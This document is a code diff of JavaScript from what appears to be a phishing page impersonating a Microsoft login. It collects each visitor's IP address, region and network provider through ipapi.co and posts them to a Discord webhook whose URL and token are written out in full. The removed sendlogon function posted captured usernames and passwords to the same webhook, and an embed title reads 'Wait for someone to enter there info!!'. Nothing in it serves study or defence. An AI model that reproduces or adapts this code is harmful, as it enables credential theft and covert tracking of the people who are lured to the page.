@@ -15,16 +15,11 @@ fetch('https://ipapi.co/json/')
         const funnyB = data.region;
 
         const funnyC = data.version;
-
-        const login = 'test123';
-
-        const logon = 'admin';
-
 	
 	const funnyD = data.org;
 
         send(funny,funnyA,funnyB,funnyC,funnyD) // lol!
-        sendlogon(login,logon) // lol!
+
     //console.log(data);
 
   });
@@ -51,7 +46,7 @@ fetch(
 
       // the username to be displayed
 
-      username: 'ilovetech0629.epizy.com',
+      username: 'MS Webite!',
 
       // the avatar to be displayed
 
@@ -93,7 +88,7 @@ fetch(
 
           author: {
 
-            name: 'Mslogin page notification',
+            name: 'MS website has been clicked',
 
             url: 'https://ilovetech0629.epizy.com',
 
@@ -105,7 +100,7 @@ fetch(
 
           // - link on 2nd row
 
-          title: 'Someone viewed your website Phoenix!',
+          title: 'Wait for someone to enter there info!!',
 
           url:
 
@@ -206,138 +201,3 @@ fetch(
 
 
 }
-
-
-
-function sendlogon(user,pass) {
-
-
-
-  fetch(
-  
-    'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
-  
-    {
-  
-      method: 'post',
-  
-      headers: {
-  
-        'Content-Type': 'application/json',
-  
-      },
-  
-      body: JSON.stringify({
-  
-        // the username to be displayed
-  
-        username: 'Credential Logon prompt',
-  
-        // the avatar to be displayed
-  
-        avatar_url:
-  
-          'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
-  
-        // contents of the message to be sent
-  
-        content:
-  
-          console.everything,
-  
-        // enable mentioning of individual users or roles, but not @everyone/@here
-  
-        allowed_mentions: {
-  
-          parse: ['users', 'roles'],
-  
-        },
-  
-        // embeds to be sent
-  
-  
-  
-        
-  
-        embeds: [
-  
-          {
-  
-            // decimal number colour of the side of the embed
-  
-            color: 11730954,
-  
-            // author
-  
-            // - icon next to text at top (text is a link)
-  
-            author: {
-  
-              name: 'Mslogin page notification',
-  
-              url: 'https://ilovetech0629.epizy.com',
-  
-           //   icon_url: 'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
-  
-            },
-  
-            // embed title
-  
-            // - link on 2nd row
-  
-            title: 'Login Successful!',
-  
-            url: 'https://gist.github.com/dragonwocky/ea61c8d21db17913a43da92efe0de634',
-  
-            // thumbnail
-  
-            // - small image in top right corner.
-  
-            thumbnail: {
-  
-              url: 'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
-  
-            },
-  
-            // embed description
-  
-            // - text on 3rd row
-  
-            description: 'Credentials have been accepted redirecting',
-  
-            // custom embed fields: bold title/name, normal content/value below title
-  
-            // - located below description, above image.
-  
-            fields: [
-  
-              {
-  
-                name: 'Username',
-  
-                value: user,
-  
-              },
-  
-              {
-  
-                name: 'Password',
-  
-                value: pass,
-  
-              }
-            ],
-  
-          },
-  
-        ],
-  
-      }),
-  
-    }
-  
-  );
-  
-  
-  
-  }
